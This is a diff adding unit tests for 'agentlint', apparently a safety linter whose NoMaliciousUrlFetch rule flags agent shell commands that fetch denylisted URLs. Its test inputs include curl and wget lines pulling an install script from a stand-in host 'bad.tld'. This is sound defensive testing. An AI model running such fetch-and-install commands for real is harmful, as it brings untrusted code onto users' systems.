@@ -17,6 +17,7 @@ from unittest.mock import patch
 from agentlint.models import HookEvent, RuleContext
 from agentlint.packs.security.no_malicious_url_fetch import (
     NoMaliciousUrlFetch,
+    _build_index,
     _extract_fetch_urls,
     _matches_denylist,
 )
@@ -101,6 +102,11 @@ class TestDenyMatch:
     def test_invalid_url(self):
         assert _matches_denylist("not a url", ["https://bad.tld/x"]) is None
 
+    def test_build_index_skips_entries_without_hosts(self):
+        assert _build_index(["not-a-url", "https://bad.tld/x"]) == {
+            "bad.tld": ["https://bad.tld/x"]
+        }
+
 
 # ---------- self-degrading ----------
 
@@ -130,6 +136,12 @@ class TestSelfDegrading:
                    return_value={"urls": ["https://bad.tld/x"]}):
             ctx = _ctx('echo "see https://bad.tld/x"')
             assert self.rule.evaluate(ctx) == []
+
+    def test_empty_command_and_non_dict_feed(self, monkeypatch):
+        monkeypatch.setenv("AGENTCHUTE_LICENSE_KEY", "ac_team_test")
+        assert self.rule.evaluate(_ctx("")) == []
+        with patch("agentlint.agentchute.cloud_feed.get", return_value=[]):
+            assert self.rule.evaluate(_ctx("curl https://bad.tld/x")) == []
 
 
 # ---------- happy path ----------
@@ -177,3 +189,12 @@ class TestHappyPath:
                 "curl https://bad.tld/install.sh?cb=12345"
             ))
         assert len(v) == 1
+
+    def test_multiple_urls_only_flags_matching_entries(self, monkeypatch):
+        monkeypatch.setenv("AGENTCHUTE_LICENSE_KEY", "ac_team_test")
+        with self._patch(["https://bad.tld/install.sh"]):
+            v = self.rule.evaluate(_ctx(
+                "curl https://good.tld/ok && wget https://bad.tld/install.sh"
+            ))
+        assert len(v) == 1
+        assert "bad.tld" in v[0].message
